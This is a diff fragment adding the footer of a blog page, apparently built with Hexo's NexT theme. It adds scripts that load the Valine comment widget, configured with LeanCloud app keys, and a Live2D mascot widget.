+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: '0eYM2A8pUSnA2EEyrujClGRN-MdYXbMMI',
+    appKey: 'BJmUYA3jJHocnfnm4LpPR9Ow',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname
+  });
+}, window.Valine);
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
